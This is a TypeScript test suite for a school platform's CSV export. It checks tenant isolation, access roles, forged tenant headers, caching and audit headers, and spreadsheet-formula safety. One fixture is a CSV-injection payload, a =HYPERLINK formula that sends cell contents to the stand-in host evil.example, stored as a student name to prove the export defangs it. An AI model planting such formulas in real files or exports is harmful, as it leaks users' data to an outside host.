/**
 * The students export.  (P11 §2, §3, §22, §25, §26, §27, §28)
 *
 * This is the first feature in the product whose output leaves as a FILE, so
 * the tests are written against the file rather than against the response.
 *
 * The distinction is the whole point. Every isolation test in this repository
 * until now could assert on a status code or a JSON body, and a 403 is a
 * refusal you can see. An export that returns 200 with somebody else's roster
 * is also a 200 — indistinguishable from success unless something opens the
 * bytes and reads them. So every cross-tenant assertion below parses the CSV
 * and looks at the names inside it.
 *
 *   DATABASE_URL=postgres://… node --test services/academics-svc/test/export-students.test.ts
 */
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';

import { createDb, type Db, type TenantContext } from '../../../packages/server-core/src/db.ts';
import {
  installTestKeys, call, lockFixtures, unlockFixtures, asBootstrap,
} from '../../../packages/server-core/test/harness.ts';
import { parseCsv } from '../../../packages/server-core/src/csv.ts';

const DATABASE_URL = process.env.DATABASE_URL;
const skip = !DATABASE_URL ? 'DATABASE_URL not set' : false;

/* Two schools whose data is deliberately similar, so a leak cannot hide as
 * a coincidence: both have a নবম/ক, both have a roll 1. Only the NAMES
 * differ, and the names are what the assertions read. */
const T_A    = '7b110000-0000-4000-8000-0000000000a0';
const T_B    = '7b110000-0000-4000-8000-0000000000b0';
const HEAD_A = '7b110000-0000-4000-8000-0000000000a1';
const HEAD_B = '7b110000-0000-4000-8000-0000000000b1';
const IT_A   = '7b110000-0000-4000-8000-0000000000a7';
const TEACH_A= '7b110000-0000-4000-8000-0000000000a8';
const STU_A1 = '7b110000-0000-4000-8000-0000000000a2';
const STU_A2 = '7b110000-0000-4000-8000-0000000000a3';
/** Admitted, never placed in a section. Must still appear in A's own file. */
const STU_A3 = '7b110000-0000-4000-8000-0000000000a4';
const STU_B1 = '7b110000-0000-4000-8000-0000000000b2';

const YEAR_A = '7b110000-0000-4000-8000-0000000000c1';
const YEAR_B = '7b110000-0000-4000-8000-0000000000c2';
const CLS_A  = '7b110000-0000-4000-8000-0000000000d1';
const CLS_B  = '7b110000-0000-4000-8000-0000000000d2';
const SEC_A  = '7b110000-0000-4000-8000-0000000000e1';
const SEC_B  = '7b110000-0000-4000-8000-0000000000e2';

/** The name a spreadsheet would run. §25. */
const HOSTILE_NAME = '=HYPERLINK("http://evil.example/?c="&A1,"click")';

let db: Db;
let tokens: Record<string, string> = {};
let exportData: typeof import('../api/export.ts').default;

const ctxA: TenantContext = { tenantId: T_A, userId: HEAD_A, role: 'principal' };
const ctxB: TenantContext = { tenantId: T_B, userId: HEAD_B, role: 'principal' };

async function drop(): Promise<void> {
  for (const ctx of [ctxA, ctxB]) {
    await asBootstrap(db, ctx, async (c) => {
      await c.query('DELETE FROM tenants WHERE id = $1', [ctx.tenantId]);
    });
  }
}

function phoneFor(id: string): string {
  const n = parseInt(id.slice(-4), 16) % 100000000;
  return `+88017${String(n).padStart(8, '0')}`;
}

async function seed(
  ctx: TenantContext, t: string, head: string, year: string, klass: string,
  section: string, slug: string,
  students: Array<[string, string, string]>,   // id, name, student_code
  extraStaff: Array<[string, string]> = [],    // id, role_code
): Promise<void> {
  await asBootstrap(db, ctx, async (c) => {
    await c.query(
      `INSERT INTO tenants (id, slug, name_bn, name_en, stream, level)
       VALUES ($1,$2,'পি১১','P11','bangla_medium','secondary')`, [t, slug]);
    await c.query(
      `INSERT INTO users (id, tenant_id, full_name_bn, full_name_en, phone_e164, status)
       VALUES ($1,$2,'প্রধান','Head',$3,'active')`, [head, t, phoneFor(head)]);
    await c.query(
      `INSERT INTO user_roles (tenant_id, user_id, role_code) VALUES ($1,$2,'principal')`,
      [t, head]);
    for (const [id, role] of extraStaff) {
      await c.query(
        `INSERT INTO users (id, tenant_id, full_name_bn, full_name_en, phone_e164, status)
         VALUES ($1,$2,'কর্মী','Staff',$3,'active')`, [id, t, phoneFor(id)]);
      await c.query(
        `INSERT INTO user_roles (tenant_id, user_id, role_code) VALUES ($1,$2,$3)`,
        [t, id, role]);
    }
    await c.query(
      `INSERT INTO academic_years (id, tenant_id, label, starts_on, ends_on, is_current)
       VALUES ($1,$2,'2026','2026-01-01','2026-12-31',true)`, [year, t]);
    await c.query(
      `INSERT INTO classes (id, tenant_id, level_no, name_bn, name_en, stream)
       VALUES ($1,$2,9,'নবম','Nine','bangla_medium')`, [klass, t]);
    await c.query(
      `INSERT INTO sections (id, tenant_id, class_id, academic_year_id, name, student_count)
       VALUES ($1,$2,$3,$4,'ক',0)`, [section, t, klass, year]);

    let roll = 1;
    for (const [id, name, code] of students) {
      await c.query(
        `INSERT INTO users (id, tenant_id, full_name_bn, full_name_en, phone_e164,
                            father_name_bn, status)
         VALUES ($1,$2,$3,$3,$4,'পিতা','active')`, [id, t, name, phoneFor(id)]);
      await c.query(
        `INSERT INTO user_roles (tenant_id, user_id, role_code) VALUES ($1,$2,'student')`,
        [t, id]);
      await c.query(
        `INSERT INTO student_profiles (user_id, tenant_id, student_code,
                                       admission_date, lifecycle_status)
         VALUES ($1,$2,$3,'2026-01-05','enrolled')`, [id, t, code]);
      // STU_A3 is deliberately left unenrolled.
      if (id !== STU_A3) {
        await c.query(
          `INSERT INTO enrolments (tenant_id, student_id, section_id, academic_year_id,
                                   roll_no, status)
           VALUES ($1,$2,$3,$4,$5,'active')`, [t, id, section, year, roll++]);
      }
    }
  });
}

before(async () => {
  if (skip) return;
  await installTestKeys();
  await lockFixtures(DATABASE_URL!);
  db = createDb(DATABASE_URL!);
  exportData = (await import('../api/export.ts')).default;

  await drop();
  await seed(ctxA, T_A, HEAD_A, YEAR_A, CLS_A, SEC_A, 'p11-a', [
    [STU_A1, 'রাফি আহমেদ', 'A-001'],
    [STU_A2, HOSTILE_NAME, 'A-002'],
    [STU_A3, 'অভি হাসান', 'A-003'],
  ], [[IT_A, 'it_admin'], [TEACH_A, 'class_teacher']]);
  await seed(ctxB, T_B, HEAD_B, YEAR_B, CLS_B, SEC_B, 'p11-b', [
    [STU_B1, 'বি-স্কুলের ছাত্র', 'B-001'],
  ]);

  const { signAccessToken } = await import('../../../packages/server-core/src/jwt.ts');
  tokens = {
    headA:  await signAccessToken({ tid: T_A, sub: HEAD_A, role: 'principal', roles: ['principal'] }),
    headB:  await signAccessToken({ tid: T_B, sub: HEAD_B, role: 'principal', roles: ['principal'] }),
    itA:    await signAccessToken({ tid: T_A, sub: IT_A, role: 'it_admin', roles: ['it_admin'] }),
    teachA: await signAccessToken({ tid: T_A, sub: TEACH_A, role: 'class_teacher', roles: ['class_teacher'] }),
  };
});

after(async () => {
  if (skip) return;
  await drop();
  await db.end();
  await unlockFixtures();
});

/** Fetch an export and parse the FILE, not the response. */
async function exportCsv(token: string, dataset = 'students') {
  const url = dataset.startsWith('/')
    ? dataset
    : `/api/v1/academics/export?dataset=${dataset}`;
  const r = await call(exportData, { url, token });
  return { r, csv: r.status === 200 ? parseCsv(r.raw) : null };
}

/** Every name cell in the file. What a leak would show up in. */
const namesIn = (csv: ReturnType<typeof parseCsv>): string[] =>
  csv.rows.map((row) => row.cells['নাম'] ?? '');

describe('P11 §2 — the students export', { skip }, () => {
  test('THE ONE THAT MATTERS — the file contains this school and no other', async () => {
    // A 403 is a refusal anyone can see. A 200 carrying the wrong school is
    // the failure this whole file exists for, and it is only visible by
    // reading the bytes.
    const { r, csv } = await exportCsv(tokens.headA);
    assert.equal(r.status, 200);
    const names = namesIn(csv!);
    assert.ok(names.includes('রাফি আহমেদ'), 'A’s own student is missing from A’s export');
    assert.ok(!names.includes('বি-স্কুলের ছাত্র'), 'B’s student appeared in A’s file');
    assert.doesNotMatch(r.raw, /বি-স্কুলের/, 'B’s data is somewhere in A’s bytes');
  });

  test('and the same holds in the other direction', async () => {
    const { r, csv } = await exportCsv(tokens.headB);
    assert.equal(r.status, 200);
    const names = namesIn(csv!);
    assert.deepEqual(names, ['বি-স্কুলের ছাত্র'], 'B’s file is not exactly B');
    assert.doesNotMatch(r.raw, /রাফি|অভি/, 'A’s data reached B’s file');
  });

  test('§26 — the row count matches the school’s own student count', async () => {
    // Counted independently, in SQL, rather than by the exporter counting
    // itself and calling that validation.
    const { rows } = await asBootstrap(db, ctxA, async (c) => c.query<{ n: string }>(
      `SELECT count(*)::text AS n FROM student_profiles`));
    const { csv } = await exportCsv(tokens.headA);
    assert.equal(csv!.rows.length, Number(rows[0].n));
  });

  test('THE ONE THE FIXTURE COULD NOT SHOW — a student enrolled in two years appears ONCE', async () => {
    // `enrolments` is unique on (tenant, academic_year, student), so a
    // student may legitimately hold an active enrolment in 2025 AND 2026.
    // The first version of the query LEFT JOINed on status='active' and
    // emitted such a student twice — in an export whose whole purpose is a
    // faithful copy. Nothing in the fixture had that shape, so nothing
    // failed; this test gives it that shape on purpose.
    const YEAR_OLD = '7b110000-0000-4000-8000-0000000000c9';
    const SEC_OLD  = '7b110000-0000-4000-8000-0000000000e9';
    await asBootstrap(db, ctxA, async (c) => {
      await c.query(
        `INSERT INTO academic_years (id, tenant_id, label, starts_on, ends_on, is_current)
         VALUES ($1,$2,'2025','2025-01-01','2025-12-31',false)
         ON CONFLICT DO NOTHING`, [YEAR_OLD, T_A]);
      await c.query(
        `INSERT INTO sections (id, tenant_id, class_id, academic_year_id, name, student_count)
         VALUES ($1,$2,$3,$4,'খ',0) ON CONFLICT DO NOTHING`, [SEC_OLD, T_A, CLS_A, YEAR_OLD]);
      await c.query(
        `INSERT INTO enrolments (tenant_id, student_id, section_id, academic_year_id,
                                 roll_no, status)
         VALUES ($1,$2,$3,$4,99,'active') ON CONFLICT DO NOTHING`,
        [T_A, STU_A1, SEC_OLD, YEAR_OLD]);
    });

    const { csv } = await exportCsv(tokens.headA);
    const rafi = csv!.rows.filter((r) => r.cells['নাম'] === 'রাফি আহমেদ');
    assert.equal(rafi.length, 1,
      `a student with two active enrolments produced ${rafi.length} rows`);
    // And the row that survived is the CURRENT year, not the old one.
    assert.equal(rafi[0].cells['শিক্ষাবর্ষ'], '2026');

    await asBootstrap(db, ctxA, async (c) => {
      await c.query(`DELETE FROM enrolments WHERE academic_year_id = $1`, [YEAR_OLD]);
      await c.query(`DELETE FROM sections WHERE id = $1`, [SEC_OLD]);
      await c.query(`DELETE FROM academic_years WHERE id = $1`, [YEAR_OLD]);
    });
  });

  test('a student with no section is still in their school’s own file', async () => {
    // A LEFT JOIN, on purpose. An inner one would silently shorten the file,
    // and a portability export that omits people is worse than none.
    const { csv } = await exportCsv(tokens.headA);
    assert.ok(namesIn(csv!).includes('অভি হাসান'),
      'the unenrolled student was dropped by the join');
  });
});

describe('P11 §4 — the tenant is never taken from the request', { skip }, () => {
  test('a forged tenant in the query string changes nothing', async () => {
    const { r, csv } = await exportCsv(tokens.headA,
      `/api/v1/academics/export?dataset=students&tenantId=${T_B}&tenant_id=${T_B}`);
    assert.equal(r.status, 200);
    assert.ok(!namesIn(csv!).includes('বি-স্কুলের ছাত্র'), 'a query parameter pivoted the export');
  });

  test('a forged tenant header changes nothing', async () => {
    const r = await call(exportData, {
      url: '/api/v1/academics/export?dataset=students',
      token: tokens.headA,
      headers: { 'x-tenant-id': T_B, 'x-user-id': HEAD_B, 'x-role': 'principal' },
    });
    assert.equal(r.status, 200);
    assert.doesNotMatch(r.raw, /বি-স্কুলের/, 'a forged header pivoted the export');
  });
});

describe('P11 §22 — who may take the school out as a file', { skip }, () => {
  test('the head and the IT admin may', async () => {
    assert.equal((await exportCsv(tokens.headA)).r.status, 200);
    assert.equal((await exportCsv(tokens.itA)).r.status, 200);
  });

  test('a class teacher may not — reading a roster is not exporting the school', async () => {
    // They can already read their own section on a screen. Nobody gains data
    // because export exists.
    const { r } = await exportCsv(tokens.teachA);
    assert.equal(r.status, 403);
  });

  test('an unauthenticated caller may not', async () => {
    const r = await call(exportData, { url: '/api/v1/academics/export?dataset=students' });
    assert.equal(r.status, 401);
  });
});

describe('P11 §25 — the file is safe to open in a spreadsheet', { skip }, () => {
  test('THE ONE THAT MATTERS — a formula in a name is neutralised', async () => {
    // Somebody typed this into a name field. Excel would make it a live
    // link, and the export is the delivery mechanism.
    const { r } = await exportCsv(tokens.headA);
    assert.match(r.raw, /'=HYPERLINK/, 'the formula was not defanged');
    assert.doesNotMatch(r.raw, /(?<!')=HYPERLINK/, 'a raw formula survived into the file');
  });

  test('Bangla is untouched and the file is BOM-led UTF-8', async () => {
    const { r } = await exportCsv(tokens.headA);
    assert.equal(r.raw.charCodeAt(0), 0xfeff, 'no BOM — Excel will render mojibake');
    assert.match(r.raw, /রাফি আহমেদ/, 'a Bangla name was mangled or defanged');
  });

  test('the file round-trips through the product’s own parser', async () => {
    const { r, csv } = await exportCsv(tokens.headA);
    assert.ok(csv!.headers.includes('শিক্ষার্থী আইডি'));
    assert.equal(r.raw.split('\r\n').length - 1, csv!.rows.length + 1);
  });
});

describe('P11 §6 — the file says nothing a school should not read', { skip }, () => {
  test('no uuid, no internal column, no secret', async () => {
    const { r } = await exportCsv(tokens.headA);
    assert.doesNotMatch(r.raw, /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-/i, 'a raw uuid is in the file');
    assert.doesNotMatch(r.raw, /tenant_id|user_id|section_id|password|hash|token|ciphertext|blind_index/i,
      'an internal field name or secret reached the file');
  });

  test('the columns are Bangla words, not database identifiers', async () => {
    const { csv } = await exportCsv(tokens.headA);
    for (const h of csv!.headers) {
      assert.doesNotMatch(h, /^[a-z_]+$/, `column "${h}" is a database name, not a heading`);
    }
  });
});

describe('P11 §24/§27/§28 — headers, errors and the audit', { skip }, () => {
  test('the response tells every cache to keep nothing', async () => {
    const { r } = await exportCsv(tokens.headA);
    assert.match(r.headers['Cache-Control'] ?? '', /no-store/);
    assert.match(r.headers['Content-Disposition'] ?? '', /^attachment; filename="students-\d{4}-\d{2}-\d{2}\.csv"$/);
    assert.match(r.headers['Content-Type'] ?? '', /text\/csv; charset=utf-8/);
  });

  test('the filename carries no tenant identifier', async () => {
    const { r } = await exportCsv(tokens.headA);
    assert.doesNotMatch(r.headers['Content-Disposition'] ?? '', /[0-9a-f]{8}-[0-9a-f]{4}/i);
  });

  test('an unknown dataset is refused before anything is written', async () => {
    const r = await call(exportData, {
      url: '/api/v1/academics/export?dataset=everything', token: tokens.headA });
    assert.equal(r.status, 400);
    assert.equal((r.body as { error: string }).error, 'unknown_dataset');
    assert.doesNotMatch(r.raw, /﻿/, 'a refusal still emitted a file');
  });

  test('§28 — the export is recorded, with a count and without the rows', async () => {
    await exportCsv(tokens.headA);
    const { rows } = await asBootstrap(db, ctxA, async (c) => c.query<{
      action: string; after_state: { dataset?: string; rows?: number } | null }>(
      `SELECT action, after_state FROM audit.activity_log
        WHERE tenant_id = $1 AND action = 'ops.data.export'
        ORDER BY created_at DESC LIMIT 1`, [T_A]));
    assert.equal(rows.length, 1, 'the export left no audit entry');
    assert.equal(rows[0].after_state?.dataset, 'students');
    assert.ok((rows[0].after_state?.rows ?? 0) > 0, 'the row count was not recorded');
    // The narration must not become a second copy of the data.
    assert.doesNotMatch(JSON.stringify(rows[0].after_state), /রাফি|আহমেদ/,
      'the audit entry contains exported row content');
  });
});

describe('P11 §11 — the attendance export carries actual attendance', { skip }, () => {
  const SESSION = '7b110000-0000-4000-8000-0000000000f1';

  test('THE ONE THAT MATTERS — real records, not the blank-grid document', async () => {
    // The FINAL-OWNER audit named this trap directly: `attendance_sheet` is
    // the blank-grid PAPER fallback and contains no attendance at all. A
    // school handed that as their "attendance export" would have been given
    // nothing while believing they had everything.
    await asBootstrap(db, ctxA, async (c) => {
      await c.query(
        `INSERT INTO attendance_sessions
           (id, tenant_id, section_id, academic_year_id, taken_on, period_no,
            mode, taken_by, taken_at)
         VALUES ($1,$2,$3,$4,'2026-03-02',1,'section_daily',$5, now())
         ON CONFLICT DO NOTHING`, [SESSION, T_A, SEC_A, YEAR_A, HEAD_A]);
      await c.query(
        `INSERT INTO attendance_records
           (tenant_id, session_id, student_id, section_id, taken_on, status,
            minutes_late, marked_by, marked_at)
         VALUES ($1,$2,$3,$4,'2026-03-02','late',12,$5, now())
         ON CONFLICT DO NOTHING`, [T_A, SESSION, STU_A1, SEC_A, HEAD_A]);
    });

    const { r, csv } = await exportCsv(tokens.headA, 'attendance');
    assert.equal(r.status, 200);
    const row = csv!.rows.find((x) => x.cells['শিক্ষার্থীর নাম'] === 'রাফি আহমেদ');
    assert.ok(row, 'the attendance record is missing from the export');
    assert.equal(row!.cells['তারিখ'], '2026-03-02');
    assert.equal(row!.cells['অবস্থা'], 'দেরিতে');
    assert.equal(row!.cells['কত মিনিট দেরি'], '12');
    assert.equal(row!.cells['যিনি নিয়েছেন'], 'প্রধান');
  });

  test('one school’s attendance never reaches another’s file', async () => {
    const b = await exportCsv(tokens.headB, 'attendance');
    assert.equal(b.r.status, 200);
    assert.doesNotMatch(b.r.raw, /রাফি|অভি/, 'A’s attendance is in B’s file');
  });
});

describe('P11 §12 — the results export', { skip }, () => {
  test('per-subject marks, so a GPA can be recomputed from them', async () => {
    // §12 asks for enough structure to reconstruct the history. Component
    // marks are that: a GPA follows from subjects, subjects do not follow
    // from a GPA.
    const { r, csv } = await exportCsv(tokens.headA, 'results');
    assert.equal(r.status, 200);
    for (const h of ['সৃজনশীল', 'নৈর্ব্যক্তিক', 'মোট নম্বর', 'গ্রেড', 'বিষয়']) {
      assert.ok(csv!.headers.includes(h), `missing column ${h}`);
    }
  });

  test('the results file carries no uuid and no secret', async () => {
    const { r } = await exportCsv(tokens.headA, 'results');
    assert.doesNotMatch(r.raw, /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-/i);
    assert.doesNotMatch(r.raw, /password|hash|secret|token|ciphertext/i);
  });

  test('every academics dataset refuses a class teacher', async () => {
    for (const d of ['students', 'attendance', 'results']) {
      const r = await call(exportData, {
        url: `/api/v1/academics/export?dataset=${d}`, token: tokens.teachA });
      assert.equal(r.status, 403, d);
    }
  });
});
